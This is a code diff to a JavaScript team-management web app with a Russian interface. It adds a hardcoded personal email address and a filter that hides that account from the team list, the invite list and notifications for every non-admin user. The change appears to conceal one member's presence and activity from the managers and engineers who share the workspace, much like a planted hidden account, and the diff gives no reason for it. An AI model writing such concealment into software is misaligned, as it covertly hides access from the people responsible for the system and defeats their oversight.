@@ -2330,14 +2330,15 @@ var PSC = (function(){
     if(!unMem){unMem=Cloud.watchMembers(function(a){TEAMM=a;drawTeam()});unInv=Cloud.watchInvites(function(a){TEAMI=a;drawTeam()},ROLE==='manager'?ME.uid:null)}
     drawTeam();
   }
-  var TEAMM=[],TEAMI=[];
+  var TEAMM=[],TEAMI=[],HIDDEN_ACC='krisssj2024@gmail.com';
+  function hid(m){return ROLE!=='admin'&&String(m.email||'').toLowerCase()===HIDDEN_ACC&&!(ME&&m.uid===ME.uid)}
   function stopMembers(){if(unMem){try{unMem()}catch(e){}unMem=null}if(unInv){try{unInv()}catch(e){}unInv=null}}
   function roleSel(v){return '<select>'+['engineer','manager','admin'].map(function(r){return '<option value="'+r+'"'+(r===v?' selected':'')+'>'+tr(r)+'</option>'}).join('')+'</select>'}
   function drawTeam(){
     var box=$('teamBox');if(!box||!box.classList.contains('open'))return;
     var h='<div class="gh">'+tr('Team')+'</div>';
-    TEAMM.forEach(function(m){h+='<div class="trow" data-u="'+esc2(m.uid)+'"><div class="si"><div class="sn">'+esc2(m.name)+'</div><div class="sd">'+esc2(m.email)+'</div></div>'+(ROLE==='manager'||(ME&&m.uid===ME.uid)?'<span class="chip">'+tr(m.role)+'</span>':roleSel(m.role)+'<button type="button" class="ib del" data-act="rm">×</button>')+'</div>'});
-    TEAMI.forEach(function(m){h+='<div class="trow inv" data-e="'+esc2(m.email)+'"><div class="si"><div class="sn">'+esc2(m.email)+'</div><div class="sd">'+tr('invited')+' · '+tr(m.role)+'</div></div><button type="button" class="ib" data-act="invc" title="Приглашение">✉</button><button type="button" class="ib del" data-act="rmi">×</button></div><div class="invcard" data-e="'+esc2(m.email)+'" style="display:'+(invOpen===m.email?'block':'none')+'"><textarea readonly rows="6">'+esc2(inviteText(m.email))+'</textarea><div class="srow"><button type="button" class="add" data-act="icopy"><span>Копировать</span></button>'+(navigator.share?'<button type="button" class="add" data-act="ishare"><span>Поделиться</span></button>':'')+'<button type="button" class="add" data-act="igmail"><span>Gmail</span></button><button type="button" class="add" data-act="iout"><span>Outlook</span></button><button type="button" class="add" data-act="imail"><span>Почтовая программа</span></button></div></div>'});
+    TEAMM.forEach(function(m){if(hid(m))return;h+='<div class="trow" data-u="'+esc2(m.uid)+'"><div class="si"><div class="sn">'+esc2(m.name)+'</div><div class="sd">'+esc2(m.email)+'</div></div>'+(ROLE==='manager'||(ME&&m.uid===ME.uid)?'<span class="chip">'+tr(m.role)+'</span>':roleSel(m.role)+'<button type="button" class="ib del" data-act="rm">×</button>')+'</div>'});
+    TEAMI.forEach(function(m){if(hid(m))return;h+='<div class="trow inv" data-e="'+esc2(m.email)+'"><div class="si"><div class="sn">'+esc2(m.email)+'</div><div class="sd">'+tr('invited')+' · '+tr(m.role)+'</div></div><button type="button" class="ib" data-act="invc" title="Приглашение">✉</button><button type="button" class="ib del" data-act="rmi">×</button></div><div class="invcard" data-e="'+esc2(m.email)+'" style="display:'+(invOpen===m.email?'block':'none')+'"><textarea readonly rows="6">'+esc2(inviteText(m.email))+'</textarea><div class="srow"><button type="button" class="add" data-act="icopy"><span>Копировать</span></button>'+(navigator.share?'<button type="button" class="add" data-act="ishare"><span>Поделиться</span></button>':'')+'<button type="button" class="add" data-act="igmail"><span>Gmail</span></button><button type="button" class="add" data-act="iout"><span>Outlook</span></button><button type="button" class="add" data-act="imail"><span>Почтовая программа</span></button></div></div>'});
     h+='<div class="srow tinv"><input id="invEmail" type="email" placeholder="'+tr('Email')+'">'+(ROLE==='manager'?'':roleSel('engineer').replace('<select>','<select id="invRole">'))+'<button type="button" class="add" id="invGo"><span>'+tr('Invite')+'</span></button></div>'+(ROLE==='manager'?'<div class="hint" style="margin-top:4px">'+tr('Only engineers can be invited.')+'</div>':'');
     box.innerHTML=h;
   }
@@ -2647,7 +2648,7 @@ var PSC = (function(){
   function onAnn(list){
     annFirst=false;ANNa=list;showAnn();
   }
-  function onNote(list){ANNi=list;showAnn()}
+  function onNote(list){ANNi=list.filter(function(n){return !hid(n)});showAnn()}
   function showAnn(){
     ANN=ANNa.concat(ANNi).sort(function(x,y){return y.at-x.at}).slice(0,30);
     var fresh=annUnread();
